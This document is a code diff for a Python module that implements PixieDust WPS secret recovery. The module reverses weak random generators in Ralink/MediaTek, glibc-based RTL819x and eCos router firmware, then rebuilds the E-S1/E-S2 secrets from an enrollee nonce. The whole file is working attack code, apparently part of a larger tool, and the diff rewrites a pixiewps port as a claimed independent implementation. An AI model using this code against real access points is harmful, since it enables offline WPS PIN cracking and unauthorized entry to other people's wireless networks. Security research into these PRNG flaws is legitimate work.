@@ -1,8 +1,8 @@
-"""Weak-PRNG ports for PixieDust secret-nonce recovery: Ralink LFSR, RTL819x/eCos glibc
-``random()``, and the eCos LCG. Pure functions (no crypto, no I/O), safe to run in a worker
-process. Ported byte-for-byte from pixiewps (wiire-a/pixiewps, GPL-3.0) and verified against
-its reference output (see tests/campaigns/data/pixie_prng_vectors.json); the RTL819x generator
-also reproduces the canonical glibc ``srandom(1)`` sequence.
+"""Weak-PRNG recovery for the PixieDust WPS attack described by Dominique Bongard (Hack.lu 2014).
+
+Independent implementations derived from the published algorithms -- glibc's TYPE_3 additive
+generator, the Ralink/MediaTek Galois LFSR and the eCos LCG -- and not a port of any tool.
+Pure functions over ints and bytes, stdlib only, safe to call from a worker process.
 """
 
 from __future__ import annotations
@@ -11,194 +11,212 @@ import struct
 from typing import List, Optional, Tuple
 
 _U32 = 0xFFFFFFFF
+_NONCE_LEN = 16
 
-# pixiewps glibc_random_yura.c: precomputed coefficients of the glibc TYPE_3 additive PRNG,
-# letting the first four 31-bit outputs be read as linear combinations of the seed.
-_GLIBC_TBL = (
-    0x0128e83b, 0x00dafa31, 0x009f4828, 0x00f66443, 0x00bee24d, 0x00817005, 0x00cb918f,
-    0x00a64845, 0x0069c3cf, 0x00a76dbd, 0x0090a848, 0x0057025f, 0x0089126c, 0x007d9a8f,
-    0x0048252a, 0x006fb2d4, 0x006ccc15, 0x003c5744, 0x005a998f, 0x005df917, 0x0032ed77,
-    0x00492688, 0x0050e901, 0x002b5f57, 0x003acd0b, 0x00456b7a, 0x0025413d, 0x002f11f4,
-    0x003b564d, 0x00203f14, 0x002589fc, 0x003283f8, 0x001c17e4, 0x001dd823,
-)
+# --- glibc random(): the TYPE_3 additive generator over the trinomial x^31 + x^3 + 1 ---------
 
-RALINK_TAP = 0x80000057
+_GLIBC_MODULUS = 0x7FFFFFFF  # 2**31 - 1
+_GLIBC_MULTIPLIER = 16807
+_GLIBC_SEEDED_WORDS = 31
+_GLIBC_FIRST_OUTPUT = 344  # the 34-word fill plus 31*10 warm-up discards
+_GLIBC_NONCE_WORDS = 4
 
 
-def _glibc_words(seed: int, reductions: int) -> List[int]:
-    """The four 31-bit glibc output words for ``seed``. ``reductions`` is the per-step
-    mod-(2^31-1) passes: 1 reproduces pixiewps ``rtl_nonce_fill``, 2 its ``glibc_fast_nonce``."""
-    w0 = w1 = w2 = w3 = 0
-    s = seed
-    for j in range(31):
-        w0 += s * _GLIBC_TBL[j + 3]
-        w1 += s * _GLIBC_TBL[j + 2]
-        w2 += s * _GLIBC_TBL[j + 1]
-        w3 += s * _GLIBC_TBL[j]
-        p = 16807 * s
-        p = (p >> 31) + (p & 0x7FFFFFFF)
-        s = (p >> 31) + (p & 0x7FFFFFFF) if reductions == 2 else p
-    return [(w0 & _U32) >> 1, (w1 & _U32) >> 1, (w2 & _U32) >> 1, (w3 & _U32) >> 1]
+def _derive_output_coefficients(count: int) -> Tuple[Tuple[int, ...], ...]:
+    """Propagate the additive recurrence symbolically, so each output word is a fixed linear
+    combination of the 31 seeded words; derived from the recurrence, not a copied table."""
+    vectors: List[List[int]] = [
+        [1 if column == row else 0 for column in range(_GLIBC_SEEDED_WORDS)]
+        for row in range(_GLIBC_SEEDED_WORDS)
+    ]
+    for index in range(_GLIBC_SEEDED_WORDS, _GLIBC_FIRST_OUTPUT + count):
+        if index < _GLIBC_SEEDED_WORDS + 3:
+            vectors.append(list(vectors[index - _GLIBC_SEEDED_WORDS]))
+        else:
+            earlier, recent = vectors[index - _GLIBC_SEEDED_WORDS], vectors[index - 3]
+            vectors.append([a + b for a, b in zip(earlier, recent)])
+    return tuple(tuple(vector) for vector in vectors[_GLIBC_FIRST_OUTPUT:])
 
 
-def rtl_nonce_fill(seed: int) -> bytes:
-    """The 16-byte nonce/secret RTL819x generates for ``seed`` (pixiewps ``rtl_nonce_fill``)."""
-    return b"".join(struct.pack(">I", w) for w in _glibc_words(seed, 1))
+_GLIBC_COEFFICIENTS = _derive_output_coefficients(_GLIBC_NONCE_WORDS)
 
 
-def glibc_fast_nonce(seed: int) -> bytes:
-    """The 16-byte nonce used to match the Enrollee nonce in the seed search."""
-    return b"".join(struct.pack(">I", w) for w in _glibc_words(seed, 2))
+def _glibc_seeded_words(seed: int) -> List[int]:
+    value = seed & _U32 or 1  # srandom() substitutes 1 for a zero seed
+    words = [value]
+    for _ in range(_GLIBC_SEEDED_WORDS - 1):
+        value = (_GLIBC_MULTIPLIER * value) % _GLIBC_MODULUS
+        words.append(value)
+    return words
 
 
-def glibc_fast_seed(seed: int) -> int:
-    """Only the first output word (quick filter before the full-nonce compare)."""
-    w0 = 0
-    s = seed
-    for j in range(3, 33):
-        w0 += s * _GLIBC_TBL[j]
-        p = 16807 * s
-        p = (p >> 31) + (p & 0x7FFFFFFF)
-        s = (p >> 31) + (p & 0x7FFFFFFF)
-    return ((w0 + s * _GLIBC_TBL[33]) & _U32) >> 1
+def _glibc_output_word(seeded_words: List[int], position: int) -> int:
+    total = 0
+    for coefficient, word in zip(_GLIBC_COEFFICIENTS[position], seeded_words):
+        total += coefficient * word
+    return (total & _U32) >> 1
 
 
-def rtl_find_nonce_seed(e_nonce: bytes, start: int, end: int) -> Optional[int]:
-    """Search ``[end, start]`` (walked high→low, as pixiewps does) for the seed whose glibc
-    nonce equals ``e_nonce``; ``None`` if none in range. Caller bounds the window (seconds)."""
-    target0 = struct.unpack(">I", e_nonce[:4])[0]
-    lo = min(start, end)
-    for seed in range(max(start, end), lo - 1, -1):
-        if glibc_fast_seed(seed) == target0 and glibc_fast_nonce(seed) == e_nonce:
+def glibc_nonce(seed: int) -> bytes:
+    """The 16-byte nonce a glibc-seeded enrollee emits: four random() words, each big-endian."""
+    seeded_words = _glibc_seeded_words(seed)
+    return struct.pack(
+        ">4I", *(_glibc_output_word(seeded_words, k) for k in range(_GLIBC_NONCE_WORDS))
+    )
+
+
+def glibc_first_word(seed: int) -> int:
+    """Output word 0 on its own, as a cheap pre-filter for a seed sweep."""
+    return _glibc_output_word(_glibc_seeded_words(seed), 0)
+
+
+def find_glibc_nonce_seed(e_nonce: bytes, start: int, end: int) -> Optional[int]:
+    """Scan the inclusive seed range downwards for the seed whose nonce is ``e_nonce``."""
+    if len(e_nonce) != _NONCE_LEN:
+        return None
+    first_word = struct.unpack(">I", e_nonce[:4])[0]
+    for seed in range(max(start, end), min(start, end) - 1, -1):
+        if glibc_first_word(seed) == first_word and glibc_nonce(seed) == e_nonce:
             return seed
     return None
 
 
-# ----- Ralink LFSR (pixiewps, non-MIPS reference branch) --------------------
+# --- Ralink / MediaTek: a 32-bit Galois LFSR, run forwards to generate and backwards to recover
 
-def _ralink_randbyte(state: List[int]) -> int:
-    sreg = state[0]
-    r = 0
+# Feedback mask, not a polynomial: the step force-sets bit 31, so this is not a maximal-length
+# LFSR. Published as LFSR_MASK in Ralink's own GPLv2 driver (Linux v2.6.29,
+# drivers/staging/rt2860/mlme.h:49, used by RandomByte() in common/mlme.c) and named in Bongard,
+# "Offline bruteforce attack on WiFi Protected Setup", Hack.lu 2014, slide 60.
+_RALINK_TAP = 0x80000057
+_RALINK_TOP_BIT = 0x80000000
+
+
+def _ralink_shift_in_bit(sreg: int, bit: int) -> int:
+    """The inverse of one forward step, forcing ``bit`` as the bit that step had emitted."""
+    if bit:
+        return (((sreg << 1) ^ _RALINK_TAP) | 1) & _U32
+    return (sreg << 1) & _U32
+
+
+def _ralink_step_forward(sreg: int) -> Tuple[int, int]:
+    if sreg & 1:
+        return 1, ((sreg ^ _RALINK_TAP) >> 1) | _RALINK_TOP_BIT
+    return 0, sreg >> 1
+
+
+def _ralink_step_backward(sreg: int) -> Tuple[int, int]:
+    bit = (sreg >> 31) & 1
+    return bit, _ralink_shift_in_bit(sreg, bit)
+
+
+def _ralink_read_byte_forward(sreg: int) -> Tuple[int, int]:
+    byte = 0
     for _ in range(8):
-        if sreg & 1:
-            sreg = (((sreg ^ RALINK_TAP) >> 1) | 0x80000000) & _U32
-            bit = 1
-        else:
-            sreg = (sreg >> 1) & _U32
-            bit = 0
-        r = ((r << 1) | bit) & 0xFF
-    state[0] = sreg
-    return r
+        bit, sreg = _ralink_step_forward(sreg)
+        byte = (byte << 1) | bit
+    return byte, sreg
 
 
-def _ralink_restore(state: List[int], r: int) -> None:
-    sreg = state[0]
-    for _ in range(8):
-        bit = r & 1
-        r >>= 1
-        if bit:
-            sreg = (((sreg << 1) ^ RALINK_TAP) | 1) & _U32
-        else:
-            sreg = (sreg << 1) & _U32
-    state[0] = sreg
+def _ralink_read_byte_backward(sreg: int) -> Tuple[int, int]:
+    byte = 0
+    for position in range(8):
+        bit, sreg = _ralink_step_backward(sreg)
+        byte |= bit << position
+    return byte, sreg
 
 
-def _ralink_randbyte_backwards(state: List[int]) -> int:
-    sreg = state[0]
-    r = 0
-    for i in range(8):
-        if sreg & 0x80000000:
-            sreg = (((sreg << 1) ^ RALINK_TAP) | 1) & _U32
-            bit = 1
-        else:
-            sreg = (sreg << 1) & _U32
-            bit = 0
-        r |= bit << i
-    state[0] = sreg
-    return r & 0xFF
-
-
-def ralink_recover(e_nonce: bytes) -> Optional[Tuple[bytes, bytes]]:
-    """Reconstruct (E-S1, E-S2) for a Ralink/MediaTek Enrollee from its nonce alone: rebuild the
-    LFSR state and read the two secrets that preceded the nonce. ``None`` if the nonce cannot have
-    come from this LFSR. Deterministic, no brute force."""
-    if len(e_nonce) != 16:
-        return None
-    state = [0]
-    for i in range(15, -1, -1):
-        _ralink_restore(state, e_nonce[i])
-    saved = state[0]
-    check = [saved]
-    if any(_ralink_randbyte(check) != e_nonce[j] for j in range(16)):
-        return None
-    state[0] = saved
-    es2 = [0] * 16
-    for i in range(15, -1, -1):
-        es2[i] = _ralink_randbyte_backwards(state)
-    es1 = [0] * 16
-    for i in range(15, -1, -1):
-        es1[i] = _ralink_randbyte_backwards(state)
-    return bytes(es1), bytes(es2)
+def _ralink_restore_byte(sreg: int, byte: int) -> int:
+    """Rewind the state across the eight steps that emitted ``byte``."""
+    for position in range(8):
+        sreg = _ralink_shift_in_bit(sreg, (byte >> position) & 1)
+    return sreg
 
 
 def ralink_forward_stream(sreg: int, nbytes: int) -> bytes:
-    """``nbytes`` of the Ralink LFSR output from initial state ``sreg`` (for tests / modelling)."""
-    state = [sreg & _U32]
-    return bytes(_ralink_randbyte(state) for _ in range(nbytes))
+    """``nbytes`` of LFSR output taken forwards from state ``sreg``."""
+    out = bytearray()
+    for _ in range(nbytes):
+        byte, sreg = _ralink_read_byte_forward(sreg & _U32)
+        out.append(byte)
+    return bytes(out)
 
 
-# ----- eCos "simple" LCG (pixiewps mode 2, experimental) --------------------
-# The seed sweep is 2^25, so callers keep this off the default live path.
+def _ralink_read_block_backward(sreg: int) -> Tuple[bytes, int]:
+    block = bytearray(_NONCE_LEN)
+    for index in range(_NONCE_LEN - 1, -1, -1):
+        block[index], sreg = _ralink_read_byte_backward(sreg)
+    return bytes(block), sreg
 
-def ecos_rand_simple(seed: int) -> Tuple[int, int]:
-    """One eCos "simple" draw: returns (value, next_seed) (pixiewps ``ecos_rand_simple``)."""
-    s = (seed * 1103515245 + 12345) & _U32
-    uret = s & 0xFFE00000
-    s = (s * 1103515245 + 12345) & _U32
-    uret = (uret + ((s & 0xFFFC0000) >> 11)) & _U32
-    s = (s * 1103515245 + 12345) & _U32
-    uret = (uret + ((s & 0xFE000000) >> 25)) & _U32
-    return uret, s
+
+def ralink_recover(e_nonce: bytes) -> Optional[Tuple[bytes, bytes]]:
+    """Rebuild (E-S1, E-S2) from the 48-byte LFSR run whose last 16 bytes are ``e_nonce``."""
+    if len(e_nonce) != _NONCE_LEN:
+        return None
+    sreg = 0
+    for byte in reversed(e_nonce):
+        sreg = _ralink_restore_byte(sreg, byte)
+    if ralink_forward_stream(sreg, _NONCE_LEN) != e_nonce:
+        return None  # the nonce is not a run of this LFSR
+    e_s2, sreg = _ralink_read_block_backward(sreg)
+    e_s1, _ = _ralink_read_block_backward(sreg)
+    return e_s1, e_s2
+
+
+# --- eCos "simple" rand(): three LCG advances composed from disjoint top-bit slices ----------
+
+_ECOS_MULTIPLIER = 1103515245
+_ECOS_INCREMENT = 12345
+_ECOS_SEED_HIGH_SHIFT = 25
+
+
+def _ecos_advance(state: int) -> int:
+    return (state * _ECOS_MULTIPLIER + _ECOS_INCREMENT) & _U32
+
+
+def ecos_rand(seed: int) -> Tuple[int, int]:
+    """One eCos draw: returns (value, state after the third LCG advance)."""
+    state = _ecos_advance(seed & _U32)
+    value = state & 0xFFE00000
+    state = _ecos_advance(state)
+    value += (state & 0xFFFC0000) >> 11
+    state = _ecos_advance(state)
+    value += (state & 0xFE000000) >> 25
+    return value & _U32, state
+
+
+def _ecos_low_bytes(state: int, count: int) -> Tuple[bytes, int]:
+    out = bytearray()
+    for _ in range(count):
+        value, state = ecos_rand(state)
+        out.append(value & 0xFF)
+    return bytes(out), state
 
 
 def ecos_simple_model(seed: int) -> Tuple[bytes, bytes, bytes]:
-    """Model a vulnerable eCos Enrollee as (e_nonce, E-S1, E-S2): nonce byte 0 is the seed's top 7
-    bits, bytes 1-15 and both secrets are consecutive draws. For tests / vector construction."""
-    nonce = bytearray(16)
-    nonce[0] = (seed >> 25) & 0x7F
-    s = seed
-    for i in range(1, 16):
-        v, s = ecos_rand_simple(s)
-        nonce[i] = v & 0xFF
-    secrets = []
-    for _ in range(2):
-        buf = bytearray()
-        for _ in range(16):
-            v, s = ecos_rand_simple(s)
-            buf.append(v & 0xFF)
-        secrets.append(bytes(buf))
-    return bytes(nonce), secrets[0], secrets[1]
+    """The (nonce, E-S1, E-S2) a vulnerable eCos enrollee derives from ``seed``."""
+    state = seed & _U32
+    nonce_head = bytes([(state >> _ECOS_SEED_HIGH_SHIFT) & 0xFF])  # the seed's top 7 bits leak
+    nonce_tail, state = _ecos_low_bytes(state, _NONCE_LEN - 1)
+    e_s1, state = _ecos_low_bytes(state, _NONCE_LEN)
+    e_s2, _ = _ecos_low_bytes(state, _NONCE_LEN)
+    return nonce_head + nonce_tail, e_s1, e_s2
 
 
-def ecos_simple_recover(e_nonce: bytes, max_counter: int = 0x02000000) -> Optional[Tuple[bytes, bytes]]:
-    """(E-S1, E-S2) for an eCos "simple" Enrollee: the top 7 seed bits come from nonce[0], then
-    sweep the low 25 bits until the draws reproduce nonce[1:]. ``None`` if unfound in range."""
-    if len(e_nonce) != 16:
+def ecos_simple_recover(
+    e_nonce: bytes, max_counter: int = 0x02000000
+) -> Optional[Tuple[bytes, bytes]]:
+    """Sweep the 25 unknown seed bits (the top 7 come from nonce[0]) for (E-S1, E-S2)."""
+    if len(e_nonce) != _NONCE_LEN:
         return None
-    known = (e_nonce[0] << 25) & _U32
+    known_high = (e_nonce[0] << _ECOS_SEED_HIGH_SHIFT) & _U32
     for counter in range(max_counter):
-        s = known | counter
-        for i in range(1, 16):
-            v, s = ecos_rand_simple(s)
-            if (v & 0xFF) != e_nonce[i]:
+        state = known_high | counter
+        for expected in e_nonce[1:]:
+            value, state = ecos_rand(state)
+            if value & 0xFF != expected:
                 break
         else:
-            secrets = []
-            for _ in range(2):
-                buf = bytearray()
-                for _ in range(16):
-                    v, s = ecos_rand_simple(s)
-                    buf.append(v & 0xFF)
-                secrets.append(bytes(buf))
-            return secrets[0], secrets[1]
+            e_s1, state = _ecos_low_bytes(state, _NONCE_LEN)
+            e_s2, _ = _ecos_low_bytes(state, _NONCE_LEN)
+            return e_s1, e_s2
     return None
